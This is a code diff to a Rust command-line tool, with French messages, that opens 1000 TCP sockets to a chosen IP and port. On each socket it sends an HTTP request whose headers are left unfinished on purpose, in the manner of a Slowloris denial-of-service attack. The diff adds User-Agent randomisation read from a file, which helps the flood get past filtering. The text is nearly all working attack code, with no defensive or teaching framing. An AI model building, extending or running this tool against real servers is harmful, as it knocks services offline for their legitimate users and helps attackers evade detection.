@@ -1,7 +1,8 @@
 use std::io::Write;
 use std::net::{IpAddr, SocketAddr, TcpStream};
-use rand::random;
+use rand::{random, Rng};
 use clap::Parser;
+use std::fs;
 
 #[derive(Parser)]
 struct Cli {
@@ -30,18 +31,24 @@ impl Socket {
             format!(
                 "GET /?{} HTTP/1.1\r\nHost: 127.0.0.1\r\nUser-Agent: {}\r\nConnection: keep-alive\r\n",
                 random::<i8>(),
-                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0"
+                random_agent()
             ).as_bytes(),
         ).expect("Impossible d'envoyer les informations");
         s
     }
 }
 
+fn random_agent () -> String {
+    let file = fs::read_to_string("user-agents.txt").expect("Impossible de lire le fichiers d'agents");
+    let agent: Vec<&str> = file.lines().collect();
+    let random_line = rand::thread_rng().gen_range(0..agent.len());
+
+    agent[random_line].to_string()
+}
+
 fn main () {
 
     let  nb_sockets: usize = 1000;
-
-    println!("Création des sockets...");
 
     let args = Cli::parse();
 
@@ -49,6 +56,8 @@ fn main () {
         ip: args.ip,
         port: args.port
     };
+
+    println!("Création des sockets...");
 
     let mut sockets: Vec<TcpStream> = instance.create(nb_sockets);
 
